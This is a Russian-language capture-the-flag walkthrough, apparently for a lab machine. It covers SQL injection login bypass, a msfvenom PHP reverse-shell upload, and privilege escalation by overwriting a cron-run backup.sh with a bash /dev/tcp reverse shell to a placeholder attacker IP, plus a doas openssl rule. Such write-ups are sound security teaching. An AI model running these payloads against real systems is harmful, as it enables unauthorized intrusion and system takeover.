### ДЛЯ РЕШЕНИЯ НЕОБХОДИМО
- умение работать с sqli
- понимание js(хотя в итоге это ничего не дало)
- умение эксплуатировать openssl
### ВЗЯТИЕ ШЕЛЛА
по классике начинаем со скана портов массканом и нмапом. видим аж два порта под веб-сервера и оба с заглушкой

<img width="600" height="300" alt="image" src="https://github.com/user-attachments/assets/276a9659-a3c8-46c5-9d13-8ac0c1dbc6b9" />

Делать нечего - фаззим оба. На первом выдало несколько поддиректорий, типа /admin, /shadow - в них зашифрованный на base64 текст для прикольчика. но сервер 
на 445 порту наконец выдал полезную директорию - /managment. переходим по адресу ```http://ip:445/management``` и наконец видим сайт

<img width="600" height="400" alt="image" src="https://github.com/user-attachments/assets/6ab49d06-5072-4327-8f63-37f21ddac547" />

посмотрела код страниц - много мусора из js скриптов и невызываемых нигде функций(причем уязвимых), типа


```$('#confirm_modal #confirm').attr('onclick',$func+"("+$params.join(',')+")")``` - потенциально уязвима к xss (содержимое массива $params вставляется в HTML-атрибут без какой-либо очистки)


```t = $src.split('.')[1]``` - некорректное определение расширения файла. при возможности подгрузки его можно было бы обойти чем-то вроде 'script.php.mp4'

но это при условии отсутствия дополнительной фильтрации на бэкенде, да и смысла особо в этом нет, потому что функции нигде пока не вызываются. из интересного - увидела, что в парметре f может передаваться login, flogin, slogin, update_settings

```
   $.ajax({
   url:_base_url_+'classes/Login.php?f=flogin',
   method:'POST',
   ...
   if(resp.status == 'success'){
      location.replace(_base_url_+'faculty');
```
то есть мы можем отдельно залогиниться за студента, факультет, админа (но форма логина на всех страницах никак не отличается), а также вызывать серверного обработчика для сохранения каких-то глобальных настроек (попробовала побрутфорсить и другие возможные значения функции f, типа all_users, но безрезультатно). вообще, покопалась в коде, и тут достаточно клиентских уязвимостей (ранее описанные, да и отсутствие csrf токена банально), но особо смысла в них сейчас нет, поэтому я забила и решила просто пофаззить.

нашла поддиректорию /database. видим там креды, по всей видимости захешированные в мд5, поэтому без проблем расхешировала их через hashcat

<img width="600" height="100" alt="image" src="https://github.com/user-attachments/assets/3f28739e-faaa-409a-b6cf-269b43bf1e4a" />

попробовала зайти по полученным кредам - походу, они просто стандартные, потому что ни в одну форму логина не подошли (ну, там пароль был username123, так что да, вероятнее всего так). следующим шагом прогнала через sqlmap и увидела, что поле уязвимо к sqli. с вводом ``` ' or 1=1 -- -``` успешно зашла в админский аккаунт

<img width="600" height="200" alt="image" src="https://github.com/user-attachments/assets/211067ab-3031-44b3-8f0b-c8a6a88b5444" />

далее мы видим поля, куда можно загрузить файл. предполагая, что с фильтрацией проблема, сгенерировала файл для реверсшелла через msfvenom, запустила msfconsole и подгрузила код на php вместо картинки, а после словила реверсшелл за www-data

<img width="600" height="300" alt="image" src="https://github.com/user-attachments/assets/cb1e6e9d-fe05-455b-8954-e922f7cea0cd" />

### Повышение привилегий

Оказавшись в машине, немного полазила по директориям в поисках чего-ниубдь полезного, нашла креды от дб и еще откуда-то, но они ничего интересного не дают. После подгрузила линпис (подняла у себя питоновский сервер и загрузила на сервере через wget). В выводе увидела вот такую запись

```
Found: /etc/doas.conf
permit nopass plot_admin as root cmd openssl
 ```
понимаем, что за пользователя plot_admin мы сможем запускать openssl от рута без пароля, следовательно, через него мы можем получить полный доступ к файловой системе, а это стопроцентный рут. значит, нам надо взять юзера plot_admin. видим вот такой кронтаб:

<img width="600" height="50" alt="image" src="https://github.com/user-attachments/assets/8cb07e5e-53e7-45fd-848f-d548129d3d27" />

попробуем взять плот админа через него. в самом скрипте особо уязвимостей нет (в теории, если бы мы могли хотя бы читать сделаный бэкап, можно было бы проэксплуатировать атаку на символьную строку - скопировать в директорию /var../managment, например, rsa_id и благодаря бэкапу и изменению прав через скрипт прочитать содержимое - но увы)

<img width="600" height="196" alt="image" src="https://github.com/user-attachments/assets/3f27aae1-64c9-4fe1-8a21-92d6efc6ee44" />

но у нас есть права на директорию, в которой этот скрипт находится - можно просто его удалить и создать другой с таким же названием, но уже с пэйлоадом (```echo "bash -c \"bash -i >& /dev/tcp/your_ip/5555 0>&1\"" > backup.sh```). даем скрипту права на исполнение, командой у себя на машине ```nc -lvnp 5555``` слушаем нужный порт и ловим реверсшелл за plot_admin.

брать полноценного рута я немного поленилась, поэтому просто прочитала файл (но вообще, это можно сделать через дозапись в /etc/passwd)

<img width="600" height="100" alt="image" src="https://github.com/user-attachments/assets/437cf724-44fb-483d-ab3a-a7bb67881e68" />

оба флага взяты!
